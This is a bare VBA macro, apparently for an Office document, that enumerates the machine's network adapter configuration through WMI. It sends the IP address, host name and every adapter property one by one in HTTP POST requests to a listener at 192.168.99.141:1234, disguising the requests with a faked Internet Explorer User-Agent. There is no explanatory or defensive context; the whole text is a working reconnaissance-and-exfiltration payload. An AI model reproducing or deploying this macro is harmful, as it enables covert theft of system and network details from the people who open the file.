Sub WMI()
 
    Dim oWMISrvEx       As Object   'SWbemServicesEx
    Dim oWMIObjSet      As Object   'SWbemServicesObjectSet
    Dim oWMIObjEx       As Object   'SWbemObjectEx
    Dim oWMIProp        As Object   'SWbemProperty
    Dim sWQL            As String   'WQL Statement
    Dim n               As Long     'Generic Counter
 
    sWQL = "Select * From Win32_NetworkAdapterConfiguration"
    Set oWMISrvEx = GetObject("winmgmts:root/CIMV2")
    Set oWMIObjSet = oWMISrvEx.ExecQuery(sWQL)
    
    Set objHTTP = CreateObject("MSXML2.ServerXMLHTTP")
    URL = "http://192.168.99.141:1234"
    Dim tab_data()
    
    For Each oWMIObjEx In oWMIObjSet
        'Put a STOP here then View > Locals Window to see all properties
        If Not IsNull(oWMIObjEx.IPAddress) Then
            Debug.Print "IP:"; oWMIObjEx.IPAddress(0)
            objHTTP.Open "POST", URL, True
            objHTTP.setRequestHeader "User-Agent", "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)"
            objHTTP.send oWMIObjEx.IPAddress(0)
 
            Debug.Print "Host name:"; oWMIObjEx.DNSHostName
            For Each oWMIProp In oWMIObjEx.Properties_
                If IsArray(oWMIProp.Value) Then
                    For n = LBound(oWMIProp.Value) To UBound(oWMIProp.Value)
                        Debug.Print oWMIProp.Name & "(" & n & ")", oWMIProp.Value(n)
                        objHTTP.Open "POST", URL, True
                        objHTTP.setRequestHeader "User-Agent", "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)"
                        objHTTP.send oWMIProp.Value(n)
 
                    Next
                Else
                    Debug.Print oWMIProp.Name, oWMIProp.Value
                    objHTTP.Open "POST", URL, True
                    objHTTP.setRequestHeader "User-Agent", "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)"
                    objHTTP.send oWMIProp.Value
                End If
            Next
        End If
    Next
End Sub
